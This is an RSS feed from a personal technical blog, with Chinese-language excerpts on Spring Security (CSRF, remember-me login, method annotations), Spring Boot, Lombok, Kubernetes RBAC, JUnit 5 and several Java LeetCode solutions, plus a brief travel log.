<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title/><link>https://cch0124.github.io/</link><description>Recent content on</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 02 Nov 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://cch0124.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Spring security - CSRF(Cross-site request request forgery)</title><link>https://cch0124.github.io/code/2021-11-02-csrf/</link><pubDate>Tue, 02 Nov 2021 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/code/2021-11-02-csrf/</guid><description>CSRF 原理網路上有很多解釋這邊不再進一步介紹，推薦cloudflare 所寫的內容。
在 Spring Security CSRF 會針對 PATCH、POST、PUT 和 DELETE HTTP 方法進行防護。在先前的範例中我們將 CSRF 關閉
.and().csrf().disable(); 只要將其拿掉即可開啟 CSRF 防護。
Spring Security CSRF 原理 從 CsrfFilter 類別中查看 doFilterInternal 方法，可以大致清楚知道它的處裡邏輯。
@Override protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain) throws ServletException, IOException { request.setAttribute(HttpServletResponse.class.getName(), response); CsrfToken csrfToken = this.tokenRepository.loadToken(request); boolean missingToken = (csrfToken == null); if (missingToken) { csrfToken = this.tokenRepository.generateToken(request); this.tokenRepository.saveToken(csrfToken, request, response); } request.setAttribute(CsrfToken.class.getName(), csrfToken); request.setAttribute(csrfToken.getParameterName(), csrfToken); if (!this.requireCsrfProtectionMatcher.matches(request)) { if (this.</description></item><item><title>Spring security - user logout 與自動登入</title><link>https://cch0124.github.io/code/2021-10-30-spring-security-user-logout/</link><pubDate>Sat, 30 Oct 2021 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/code/2021-10-30-spring-security-user-logout/</guid><description>logout 以下是一個使用者登出後的配置，登出成功後頁面會跳轉到 /api/v1/index
@Override protected void configure(HttpSecurity http) throws Exception { // TODO Auto-generated method stub // logout http.logout().logoutUrl(&amp;#34;/logout&amp;#34;).logoutSuccessUrl(&amp;#34;/api/v1/index&amp;#34;).permitAll(); http.exceptionHandling().accessDeniedPage(&amp;#34;/403.html&amp;#34;); http.formLogin() // 自定義編寫登入頁面 ... } 撰寫一個登出頁面如下，同時也修改上面的 defaultSuccessUrl 配置將其換成 defaultSuccessUrl(&amp;quot;/success.html&amp;quot;)
&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt; &amp;lt;title&amp;gt;Success&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;h1&amp;gt;Success&amp;lt;/h1&amp;gt; &amp;lt;br&amp;gt; &amp;lt;a href=&amp;#34;/logout&amp;#34;&amp;gt;&amp;lt;b&amp;gt;logout&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; 實驗過程可以請求 http://localhost:8080/login.html 會跳轉到 http://localhost:8080/success.html 此時可以進行頁面的 API 請求。
自動登入 要實現的話會將數據儲存自 cookie 與 database，並進行比對。整體架構如下
________________ _____________________________ | | _____________________________________ | | | | 1 | | 2 | | | |-----------&amp;gt;| UsernamePassworAuthenticationFilter|-----------&amp;gt;| | | | |____________________________________| | | | | | ___________________ | ________ | | | | RemeberMeService| | | | | browser | | |_________________| | 4 | | | | 3 | ___________________ | --------------&amp;gt; | DB | | |&amp;lt;-------------------------------------------------------------| | TokenRepository| | 13 | | | | | |_________________| | --------------&amp;gt; |________| | | | | | | _____________________________________ | | | | 11 | | | | ______________________ | | | | 12 | | 14 | | | |-----------&amp;gt;| RememberMeAuthenticationFilter |-----------&amp;gt;| | --------------&amp;gt;| UserDetailsService | |________________| |____________________________________| |____________________________| |_____________________| 初始請求</description></item><item><title>Spring security - annotation</title><link>https://cch0124.github.io/code/2021-10-29-spring-security-annotation/</link><pubDate>Fri, 29 Oct 2021 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/code/2021-10-29-spring-security-annotation/</guid><description>註解是為了可以方便讓我們使用，以下將會介紹註解。實驗過程可藉由更改 commaSeparatedStringToAuthorityList 方法所傳遞的權限進行調整
List&amp;lt;GrantedAuthority&amp;gt; auths = AuthorityUtils.commaSeparatedStringToAuthorityList(&amp;#34;admins,ROLE_sale&amp;#34;); @Secured 判斷是否具有角色，有的話表示可以存取該方法，這邊匹配的角色需加上 **ROLE_**。在使用註解時須先開啟註解功能 @EnableGlobalMethodSecurity
@SpringBootApplication @EnableGlobalMethodSecurity(securedEnabled = true) public class Securitydemo01Application { public static void main(String[] args) { SpringApplication.run(Securitydemo01Application.class, args); } } 透過 @Secured 註解可讓該方法被限制只能是 &amp;ldquo;ROLE_sale&amp;rdquo; 或 &amp;ldquo;ROLE_manager&amp;rdquo; 才能存取。
@GetMapping(&amp;#34;/update&amp;#34;) @Secured(value = {&amp;#34;ROLE_sale&amp;#34;,&amp;#34;ROLE_manager&amp;#34;}) public String update() { return &amp;#34;Hello update&amp;#34;; } @PreAuthorize 進入該方法前的權限驗證，可將登入使用者的 roles/permissions 參數傳到方法中。同樣的要使用該註解必須啟用，在 @EnableGlobalMethodSecurity 添加 prePostEnable=true。
@GetMapping(&amp;#34;/preAuth&amp;#34;) @PreAuthorize(value = &amp;#34;hasAnyAuthority(&amp;#39;admins&amp;#39;)&amp;#34;) public String preAuth() { return &amp;#34;Hello preAuth&amp;#34;; } 其中 hasAnyAuthority 也可以是 hasAuthority、hasRole 或 hasAnyRole 等，以下整理了一張表</description></item><item><title>Spring security 概觀</title><link>https://cch0124.github.io/code/2021-10-28-spring-security-overview/</link><pubDate>Thu, 28 Oct 2021 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/code/2021-10-28-spring-security-overview/</guid><description>在 Spring Security 主要核心功能是 Authentication(使用者認證) 和 Authorization(使用者授權)兩部份。
Authentication 使用者是否能訪問該系統，一般都是透過帳號和密碼進行確認。 Authorization 用戶是否有權限執行某個操作，也就是系統上會有很多角色分配給使用者，而這些使用者能操作的動作就對應到角色。 演示 pom.xml ... &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;spring-boot-starter-security&amp;lt;/artifactId&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;spring-boot-starter-web&amp;lt;/artifactId&amp;gt; &amp;lt;/dependency&amp;gt; ... 撰寫一個 controller @RestController @RequestMapping(&amp;#34;/api/v1&amp;#34;) public class TestController { @GetMapping(&amp;#34;/hello&amp;#34;) public String hello() { return &amp;#34;Hello Security&amp;#34;; } } 對設計的 controller 進行請求 會發現會被導到一個登入頁面，這也可以表示 Spring Security 有被啟用。 預設的使用者是 user 密碼則會是在 console 中以 Using generated security password: d7ce1ace-a637-4896-8556-a531dedbab29 呈現。登入後即可呈現我們所請求的內容。
基本原理 Spring Security 和 iptable 一樣都是一串鏈連接起來的。下面會介紹較為重要的過濾器</description></item><item><title>Spring boot Web 開發 - Error Handler</title><link>https://cch0124.github.io/code/2021-10-27-error-handler-spring-boot/</link><pubDate>Wed, 27 Oct 2021 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/code/2021-10-27-error-handler-spring-boot/</guid><description>從官方介紹內容來看錯誤處理內從大概是以下
默認規則 預設下，Spring boot 提供 /error 處理所有錯誤的映射 對於非瀏覽器類型，會以 JSON 進行回應，其中包含錯誤、HTTP 狀態和異常訊息；對於瀏覽器則會以 whilelabel 進行視圖回應，會以 HTML 方式呈現 要自定義，添加 View 解析為 Error 要完全替代預設的行為，可以實作 ErrorController 並註冊該類型的 Bean 定義，或添加 ErrorAttributes 類型的組件以替換內容 異常整體流程處理
執行目標方法，只要期間有錯誤都會被 JAVA 的 catch 語法給抓到，並將當前請求結束，其過程會進入 dispatchException 進入 processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException) 當中 mv = processHandlerException，處理 handler 發生的異常，接著回傳 ModelAndView，過程會遍歷 handlerExceptionResolvers，看誰能處理，系統默認的解析起有以下 DefaultErrorAttributes 先來處理異常。把異常訊息給 request，並返回 null HandlerExceptionResolveComposite ExceptionHandlerExceptionResolver ResponseStatusExceptionResolver DefaultHandlerExceptionResolver 預設下沒有東西可以處理異常，因此異常被拋出，最後發送 /error 請求，被底層 BasicErrorController 處理。 定制錯誤邏輯 自定義錯誤頁面 在 error 目錄下進行匹配 @ControllerAdvice+@ExceptionHandler 底層是 ExceptionHandlerExceptionResolver @ResponseStatus+自定義異常 底層是 ResponseStatusExceptionResolver，把 @ResponseStatus 註解訊息底層調用 response.</description></item><item><title>lombok 利器</title><link>https://cch0124.github.io/code/2021-10-17-lombok/</link><pubDate>Sun, 17 Oct 2021 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/code/2021-10-17-lombok/</guid><description>maven 引用 Lombok 方式
&amp;lt;dependencies&amp;gt; ... &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.projectlombok&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lombok&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;1.18.20&amp;lt;/version&amp;gt; &amp;lt;scope&amp;gt;provided&amp;lt;/scope&amp;gt; &amp;lt;/dependency&amp;gt; ... &amp;lt;/dependencies&amp;gt; 在 Spring boot 中預設也將 lombok 作為套件，從下面範例來看我們透過 @Data 自動生成 get、set 方法；@ToString 產生 toString() 方法；透過 @AllArgsConstructor 產生有參數的建構方法，相反的使用 @NoArgsConstructor 則為無參數。使用 @EqualsAndHashCode 幫我們重寫 HashCode 和 equals。透過 @Slf4j 則會幫我們注入 Log 相關的操作。
@Data @ToString public class Car { private String brand; private Integer price; } 當要使用並構建一個物件時都需要
Product product = new Product(); product.setPrice(100); product.setName(&amp;#34;Apple&amp;#34;); 但藉由 @Builder 的註解，可以省下一些細節
Product product = Product.builder() .price(100) .name(&amp;#34;Apple&amp;#34;) .</description></item><item><title>Spring boot Web 開發</title><link>https://cch0124.github.io/code/2021-10-17-spring-boot-web/</link><pubDate>Sun, 17 Oct 2021 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/code/2021-10-17-spring-boot-web/</guid><description>Spring boot provides auto-configuration for Spring MVC that works well with most applications.
請求參數處理 請求映射 RequestMapping value 請求路徑 method 使用的 HTTP Method @RequestMapping(value=&amp;#34;path&amp;#34;, method=RequestMethod.GET) public SomeData requestMethodName(@RequestParam String param) { return new SomeData(); } 在 Spring boot 中以下的請求映射都繼層於 RequestMapping
GetMapping PostMapping DeleteMapping PutMapping DispatcherServlet 是處理所有請求的開始，往上追最後會繼層一個 HttpServlet，當中請求會調用 doGet 方法（如果是 Get 請求），在 DispatcherServlet 中所有請求都會調用 doDispatch(HttpServletRequest request, HttpServletResponse response)。所有請求都存在於 HandlerMapping 中在 Spring boot 中有 5 種，Spring boot 自動配置歡迎頁面的 WelcomePageHandlerMapping，只要請求訪問 / 能訪問到 index.</description></item><item><title>Spring boot 概觀</title><link>https://cch0124.github.io/code/2021-10-17-spring-boot/</link><pubDate>Sun, 17 Oct 2021 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/code/2021-10-17-spring-boot/</guid><description>Spring 能做什麼 Microservice Reactive Cloud Web apps Serverless FaaS Event Driven Batch Spring 生態圈很大。包含以下
Spring Framework DI AOP Spring Data 數據操作部分 Spring Cloud Spring Security Spring Session Spring boot 底層是 Spring Framework。Spring5 後有了變化，有了 spring reactive JAVA 8 的特性也改變底層的實現原理，像是預設的 interface。
什麼是 Spring boot Spring boot makes it easy to create stand-alone, production-grade Spring based Application that you can &amp;ldquo;just run&amp;rdquo;.</description></item><item><title>kubernetes 之訪問安全控制</title><link>https://cch0124.github.io/kubernetes/2021-10-16-security/</link><pubDate>Sat, 16 Oct 2021 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2021-10-16-security/</guid><description>Controlling Access to the Kubernetes API API Server 是存取和管理資源對象的入口，不管是 kube-controllermanager、kube-scheduler、kubelet 和kube-proxy 等都要透過 API Server 進行存取。而每一次的訪問請求都須進行合法的驗證，如身分、操作權限等，當這些流程都為正常才能將書據存入 etcd 中。當請求到 API 時，會經歷幾個階段，如下圖所示：
當收到一個用戶端的請求後，會調用 Authentication 來驗證用戶端身分，如果前者驗證通過接著會驗證 Authorization 是否有權限去操作用戶端發送的請求（建立、讀取、刪除等），如果授權(Authorization)通過驗證必須在通過 Admission Control 檢測像是 namespace 是否存在、使否違反資源限制等。
用戶端存取 API 可以透過 kubectl、函式庫或使用 REST 方式，然而可以操作的主體被分為人和 POD 物件，其分別對應 User Account 和 Service Account。
User Account 非 kubernetes 所使用的管理帳號，像是密鑰、Keystone 或是以檔案方式的使用者和密碼列表 名稱需是唯一值 Service Account 是 Kubernetes API 所管理的帳號，使用在 POD 之中的服務行程訪問 Kubernetes API 時提供的身分標識 一般會綁定特定 namespace，會附帶 Secret 資源的憑證用於訪問 API Server 上面兩種類型都可隸屬一或多個用戶組，而用戶組本身沒有操作權限，其本身只是一個 User Account 的邏輯集合。Kubernetes 有以下特殊目的的組</description></item><item><title>kubernetes 之訪問安全控制 - RBAC</title><link>https://cch0124.github.io/kubernetes/2021-10-23-rbac/</link><pubDate>Sat, 16 Oct 2021 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2021-10-23-rbac/</guid><description>RBAC(Role-Based Access Control)，它將權限授予角色(role)上，可以想像它是一個責任。對 RBAC 來說，使用者(User)是一個獨立可存取資源的主體(Subject)。這過程中被允許對一或多個 Object 執行的操作可以稱做許可(Permission)，一個使用者可藉由授權而擁有多個 role。
人 O \|/ / \ action(verb) Subject --------------------&amp;gt; Object RBAC 中 User、Role 和 Permission 關係如下
___________________________ -----&amp;gt; Role | Permissions | / \ | | User -----&amp;gt; | Operations -----&amp;gt; Objects | \ / | | -----&amp;gt; Role |___________________________| RBAC 是一個限定操作的機制，用於定義誰(subject)能或不能操作(verb)哪個物件(object)。動作的發出者(subject)可以是一個 User Accoun 或是 Service Account；verb 表示要執行的操作 create、apply、delete、update、patch、edit 和 get 等；object 是指要被操作的目標資源，以 Kubernetes API 來看是以 URL 作為對象。
RBAC 支援 Role 和 ClusterRole 兩種角色，前者是 namespace 級別後者則是集群級別，對這兩類給權限時，需要用到 RoleBinding 和 ClusterRoleBinding。RoleBinding 將 role 上的 Permissions 綁定到一個或一組使用者上，此綁定只能隸屬於某一個 namespace。ClusterRoleBinding 則用於及群集別。</description></item><item><title>單元測試</title><link>https://cch0124.github.io/code/2021-09-06.junit5/</link><pubDate>Mon, 06 Sep 2021 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/code/2021-09-06.junit5/</guid><description>Junit5 是目前最新的框架，其由三個模組組成
JUnit Platform 在 JVM 上啟動測試框架的基礎，在 Junit 之外的框架都能接入 JUnit Jupiter Junit5 的核心，內部包含了一個測試引擎，用於在 JUnit Platform 上運行 JUnit Vintage &amp;hellip; ___________________________________________________________________________________________________________________________________ | | | | | Junit5 | | ________________________ ________________________ ________________________ | | | | | | | | | | | | | | | | | | | JUnit Platform | + | JUnit Jupiter | + | JUnit Vintage | | | | | | | | | | | |_______________________| |_______________________| |_______________________| | | | | | | | | | |__________________________________________________________________________________________________________________________________| Srping boot 2.</description></item><item><title>旅行與露營紀錄</title><link>https://cch0124.github.io/life/2021-03-31-camp-history/</link><pubDate>Wed, 31 Mar 2021 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/life/2021-03-31-camp-history/</guid><description>旅行 日本 大阪 奈良 稻荷 東京 淺草 嵐山 京都 秋葉原 露營 禾田 蘇菲凱文 象山 老官道 麒麟 小野柳 旗津 島嶼咖啡 遠山望月</description></item><item><title>LeetCode 268 Missing Number</title><link>https://cch0124.github.io/code/2021-01-12-missing-number/</link><pubDate>Tue, 12 Jan 2021 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/code/2021-01-12-missing-number/</guid><description>Missing Number 題目 找出陣列中缺少的數值。思路利用數組長度帶入梯形公式算出3整個序列之和再減去目前數組中所有數值之和，即可獲取答案。
class Solution { public int missingNumber(int[] nums) { int len = nums.length; int trape = (0 + len)*(len+1)/2; int sum = Arrays.stream(nums).sum(); return trape - sum; } }</description></item><item><title>LeetCode Contains Duplicate I and II</title><link>https://cch0124.github.io/code/2021-01-02-contains-duplicate/</link><pubDate>Sat, 02 Jan 2021 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/code/2021-01-02-contains-duplicate/</guid><description>Contains Duplicate 題目 217，檢查數組中是否有相同的值。思路一使用 Hash 方式，如果出現相同值 Hash 值會撞，如果撞表示是重複值。思路二使用 Set 不存放相同的值，最後比較 Set 存放的元素個數使否小於原始數組元素個數。
class Solution { public boolean containsDuplicate(int[] nums) { HashMap&amp;lt;Integer, Integer&amp;gt; map = new HashMap&amp;lt;&amp;gt;(); for(int i=0; i&amp;lt;nums.length; i++){ if (map.containsKey(nums[i])){ return true; } else { map.put(nums[i], 1); } } return false; } } class Solution { public boolean containsDuplicate(int[] nums) { Set&amp;lt;Integer&amp;gt; set = Arrays.stream(nums).boxed().collect(Collectors.toSet()); return set.size() &amp;lt; nums.length; } } Contains Duplicate II 題目 219，相較於第一版則是多了一個條件，把出現重複的值其所在的元素位置進行相減，並且要小於或等於給定的 k。這邊延伸第一版的程式碼，只是多了位置的判別。
class Solution { public boolean containsNearbyDuplicate(int[] nums, int k) { Map&amp;lt;Integer, Integer&amp;gt; map = new HashMap&amp;lt;&amp;gt;(); for (int i=0; i&amp;lt;nums.</description></item><item><title>LeetCode Best Time to Buy and Sell Stock I and II</title><link>https://cch0124.github.io/code/2020-12-31-best-time-to-buy-and-sell-stock/</link><pubDate>Thu, 31 Dec 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/code/2020-12-31-best-time-to-buy-and-sell-stock/</guid><description>Best Time to Buy and Sell Stock I 題目說明，如果只允許最多完成一筆交易，找到最大的利潤。也就是找到最大獲利的價差。
class Solution { public int maxProfit(int[] prices) { int min = Integer.MAX_VALUE; int max = 0; for (int i=0; i&amp;lt;prices.length; i++){ int price = prices[i]; if (price &amp;lt; min){ min = price; } else if (price - min &amp;gt; max) { max = price - min; } } return max; } } Best Time to Buy and Sell Stock II 題目說明，相較於第一版，這次是找出多筆交易中可獲利最大的價值。思路是，前後的價值為正數表示此交易有獲利，最後把這多筆的獲利相加。</description></item><item><title>LeetCode Pascal's Triangle I and II</title><link>https://cch0124.github.io/code/2020-12-26-pascals-triangle/</link><pubDate>Sat, 26 Dec 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/code/2020-12-26-pascals-triangle/</guid><description>Pascal&amp;rsquo;s Triangle 題目，思路就是動態規劃的概念。
class Solution { public List&amp;lt;List&amp;lt;Integer&amp;gt;&amp;gt; generate(int numRows) { List&amp;lt;List&amp;lt;Integer&amp;gt;&amp;gt; res = new ArrayList&amp;lt;&amp;gt;(); if (numRows == 0) return res; List&amp;lt;Integer&amp;gt; base = new ArrayList&amp;lt;&amp;gt;(); base.add(1); res.add(base); for (int i=1; i&amp;lt;numRows; i++){ List&amp;lt;Integer&amp;gt; row = new ArrayList&amp;lt;&amp;gt;(); row.add(1); for(int j=1; j &amp;lt; i; j++){ row.add(res.get(i-1).get(j) + res.get(i-1).get(j-1)); } row.add(1); res.add(row); } return res; } } Pascal&amp;rsquo;s Triangle II 題目相較於第一版本它是要取出某一列，概念上是相同。
class Solution { public List&amp;lt;Integer&amp;gt; getRow(int rowIndex) { List&amp;lt;List&amp;lt;Integer&amp;gt;&amp;gt; res = new ArrayList&amp;lt;&amp;gt;(); List&amp;lt;Integer&amp;gt; base = new ArrayList&amp;lt;&amp;gt;(); base.</description></item><item><title>LeetCode Two Sum I and II</title><link>https://cch0124.github.io/code/2020-12-25-two-sum/</link><pubDate>Fri, 25 Dec 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/code/2020-12-25-two-sum/</guid><description>Two Sum I 題目內容是說從給予的陣列中找出兩個索引值相加等於給定目標值。這邊使用 HashMap 的概念實現題目要求。
class Solution {s public int[] twoSum(int[] nums, int target) { Map&amp;lt;Integer, Integer&amp;gt; map = new HashMap&amp;lt;&amp;gt;(); for (int i = 0; i &amp;lt; nums.length; i++) { int complement = target - nums[i]; if (map.containsKey(complement)) { return new int[] { map.get(complement), i }; } map.put(nums[i], i); } return new int []{}; } } Two Sum II 題目相較於第一版本對陣列進行排序。思路是使用兩個指針方式進行遍歷。
class Solution { public int[] twoSum(int[] numbers, int target) { int start = 0; int end = numbers.</description></item><item><title>物件導向 01 - extends</title><link>https://cch0124.github.io/code/2020-12-17-oop-extends/</link><pubDate>Thu, 17 Dec 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/code/2020-12-17-oop-extends/</guid><description>繼承(extends) 好處是減少代碼冗余、增加覆用性、便於功能的擴展、多態性。子類繼承父類後，子類會獲取父類的結構、屬性、方法，如果為 private，因為封裝性影響，子類不能直接調用父類結構，需透過 getter 和 setter 進行操作。
子類繼承之後可以聲名自己持有的屬性和方法，實現功能擴展。在 JAVA 只支持單繼承和多層繼承，無多重繼承。一個類能被多個子類繼承，一個類只能有一個父類。
所有 java 類（除 java.lang.Object）直接會間接繼承 java.lang.Object 類
覆寫 (override) 回傳類型、方法名和參數個數需一致 回傳類型可以是該類型的子類 同名同參數方法要是非 static 實現重寫，否則為非重寫 子類重寫的方法權限修飾不小於父類被重寫的方法的權限 子類拋出的異常範圍不能大於父類 以繼承來說 B 繼承 A，只要 B 有覆寫 A 的相關方法，則建立物件時取得的是 B 的覆寫，否則就是 A 的。
super 用來調用以下
屬性
法
建構方法
在子類的方法或建構方法中，透過使用 super.屬性或 super.方法的方式，顯示的調用父類中聲明的屬性或方法，通常都省略
當子類和父類中定義同名屬性時，要從子類調用父類的屬性，則必須使用 super.屬性或 super.方法
在建構方法中使用 super(參數列表)
需再首行</description></item><item><title>物件導向 01 - 類的成員</title><link>https://cch0124.github.io/code/2020-12-17-oop-class/</link><pubDate>Thu, 17 Dec 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/code/2020-12-17-oop-class/</guid><description>OOP 學習 JAVA 的 Class 與 Class 中的成員 屬性 方法 建構方法 區塊 內部類 以下特徵 封裝 繼承 多態 抽象 Class 與 Object Class 為對事物的描述，一種抽象概念。Object 實際存在的個體，也稱實例(instance)。
以下為 Class 範例，當中會包含屬性與行為
class Person { // 屬性 String name; int age; // 行為 public void eat() { System.out.println(&amp;#34;吃飯&amp;#34;); } public void sleep() { System.out.println(&amp;#34;睡覺&amp;#34;); } public void say(String language) { System.out.println(&amp;#34;我使用&amp;#34; + language + &amp;#34;說話&amp;#34;); } } 當把人這抽象的事物給描述好後，要建立一個實際的實例。</description></item><item><title>物件導向 03 - Interface</title><link>https://cch0124.github.io/code/2020-12-17-oop/</link><pubDate>Thu, 17 Dec 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/code/2020-12-17-oop/</guid><description>static 編寫一個類時，只有透過 new 關鍵字才會產生出物件，此時系統才會分配記憶體空間給該物件，這樣才能供外部調用。但某些特定數據在記憶體空間只有一份。台灣是個國家名稱，每一個台灣人都共享此國家名稱，不必每一個人的實例都分配一個代表國家名稱的變量。
static 修飾的變量是共享的 因為 class 只會加載一次，則 static 變量在記憶體中也只會存在一份，存在方法區的靜態域 靜態方法中，只能調用靜態的方法或屬性，非靜態方法，既可調用非靜態的方法或屬性，也可以調用靜態的方法或屬性 在靜態方法內，不能使用 this、super 關鍵字，生命週期 操作靜態屬性的方法，通常設置為 static 工具類中的方法，習慣聲名為 static 靜態變數隨著類加載而加載，因此早於物件的建立 代碼塊 用來初始類和對象 有修飾的話只能用 static 比較 靜態代碼塊 內部可以有輸出句 隨著類加載而執行，且只執行一次 初始化類的訊息 如果一個類中定義了多個靜態代碼塊，則按照宣告先後順序執行 靜態代碼塊的執行要優先於非靜態代碼塊的執行 靜態代碼塊內只調用靜態的屬性、靜態的方法，不能調用非靜態的結構 非靜態代碼塊 內部可以有輸出句 隨著物件的創見而執行 每創建一個物件，就執行一次非靜態代碼塊 可以在創建對象時，隊對象的屬性等進行初始化 如果一個類中定義了多個非靜態代碼塊，則按照宣告先後順序執行 非靜態代碼塊內只調用靜態的屬性、靜態的方法，也能調用非靜態的結構 public class Person { String name; int age; static String des = &amp;#34;Hello&amp;#34;; public Person() { } public Person(String name, int age) { this.</description></item><item><title>LeetCode 2. Add Two Numbers</title><link>https://cch0124.github.io/code/2020-12-13-addtwonumbers/</link><pubDate>Sun, 13 Dec 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/code/2020-12-13-addtwonumbers/</guid><description>題目 2. Add Two Numbers，單純的將兩個鏈接做相加。須注意的是進位而已。
/** * Definition for singly-linked list. * public class ListNode { * int val; * ListNode next; * ListNode() {} * ListNode(int val) { this.val = val; } * ListNode(int val, ListNode next) { this.val = val; this.next = next; } * } */ class Solution { public ListNode addTwoNumbers(ListNode l1, ListNode l2) { int carry = 0; ListNode dummy = new ListNode(0); ListNode cur = dummy; int l1Val = 0; int l2Val = 0; int sum = 0; while (l1 !</description></item><item><title>LeetCode 5. Longest Palindromic Substring</title><link>https://cch0124.github.io/code/2020-12-13-longestpalindromicsubstring/</link><pubDate>Sun, 13 Dec 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/code/2020-12-13-longestpalindromicsubstring/</guid><description>題目 5. Longest Palindromic Substring，這題一開始沒想出來解法，但是是知道回文規則。看了影片和一些參考資料才知道使用 DP 的原理。
class Solution { public String longestPalindrome(String s) { if (s.length() == 1) return s; if (s.length() == 2 &amp;amp;&amp;amp; s.charAt(0) == s.charAt(1)){ return s; } int start = 0; int end = 0; boolean [][] dp = new boolean[s.length()][s.length()]; // 自己和自己是回文 for (int i=0; i&amp;lt;dp.length; i++){ dp[i][i] = true; } // 相鄰的字元相同也是回文 for (int i = 0; i &amp;lt; s.length()-1; i++) { if (s.</description></item><item><title>LeetCode 62. Unique Paths and 63. Unique Paths II</title><link>https://cch0124.github.io/code/2020-12-12-uniquepaths/</link><pubDate>Sat, 12 Dec 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/code/2020-12-12-uniquepaths/</guid><description>題目 62 與 題目 63 是相似的問題，後者多了障礙物的設計。思路就是利用動態規劃，其中當前位置會是左邊與上面的能夠抵達方式的相加，因為題目限制往右和往下走。
題目 62
class Solution { public int uniquePaths(int m, int n) { int [][] dp = new int[m][n]; for(int i=0; i&amp;lt;m; i++){ for(int j=0; j&amp;lt;n; j++){ if( i == 0 || j == 0 ) { dp[i][j] = 1; } else { dp[i][j] = dp[i-1][j] + dp[i][j-1]; } } } return dp[m-1][n-1]; } } 題目 63，相較於 62 多了很多比較。我們把障礙物的當前能夠抵達次數設為 0，其做相加時不影響結果。接著起點做個判斷，非障礙物將其設為 1 以進行後續計算，在邊緣的地方有可能存在障礙物，因此不能像題目 62 一樣直接都設為 1。</description></item><item><title>LeetCode 64. Minimum Path Sum</title><link>https://cch0124.github.io/code/2020-12-12-minimumpathsum/</link><pubDate>Sat, 12 Dec 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/code/2020-12-12-minimumpathsum/</guid><description>題目 64. Minimum Path Sum 尋找最少的路徑成本從起始點 (0,0) 到最右右下角，相似於題目 62 和 63。同樣的期限制是向右和向下。
class Solution { public int minPathSum(int[][] grid) { for(int i=0; i&amp;lt;grid.length; i++){ for(int j=0; j&amp;lt;grid[0].length; j++){ if ( i == 0 &amp;amp;&amp;amp; j == 0){ continue; } if (i == 0){ grid[i][j] = grid[i][j]+grid[i][j-1]; } else if (j == 0){ grid[i][j] = grid[i][j]+grid[i-1][j]; } else { grid[i][j] = Math.min((grid[i][j] + grid[i][j-1]), (grid[i][j] + grid[i-1][j])); } } } return grid[grid.length-1][grid[0].length-1]; } } 例子</description></item><item><title>LeetCode 1306. Jump Game III</title><link>https://cch0124.github.io/code/2020-12-10-jumpgameiii/</link><pubDate>Thu, 10 Dec 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/code/2020-12-10-jumpgameiii/</guid><description>題目，會給一個起始點(start)，而這個起始點可以選擇對元素進行加或減，透過這種方式不斷進行，最後檢測有沒有辦法到達值 0 的元素。
思路就是要麻當前元素進行減或加，用遞迴方式不斷去求值。使用一個 boolean 的陣列記錄當前該位置是否訪問過。
class Solution { public boolean canReach(int[] arr, int start) { boolean [] vis = new boolean[arr.length]; return canReach(arr, start, vis); } private boolean canReach(int[] arr, int start, boolean[] vis){ if (start &amp;lt; arr.length &amp;amp;&amp;amp; start &amp;gt;= 0 &amp;amp;&amp;amp; !vis[start]){ if (arr[start] == 0){ return true; } vis[start] = true; return canReach(arr, start + arr[start], vis) || canReach(arr, start - arr[start], vis); } return false; } }</description></item><item><title>783. Minimum Distance Between BST Nodes</title><link>https://cch0124.github.io/code/2020-12-09-minimumdistancebetweenbstnodes/</link><pubDate>Wed, 09 Dec 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/code/2020-12-09-minimumdistancebetweenbstnodes/</guid><description>題目，找出兩節點最小差值，思路以中序概念來想，經過 BST 樹經過中序遍歷後其結果會是排序的樣子，因此我們只要當前的值和左邊的值進行相減逐一比較即可獲得答案。
